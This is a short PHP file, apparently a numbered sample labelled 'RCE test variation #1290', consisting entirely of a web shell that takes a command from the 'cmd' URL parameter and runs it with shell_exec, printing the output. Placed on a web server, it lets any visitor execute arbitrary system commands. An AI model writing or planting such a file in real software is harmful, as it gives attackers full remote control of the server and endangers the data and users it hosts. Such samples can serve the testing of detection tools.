<?php
// RCE test variation #1290
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>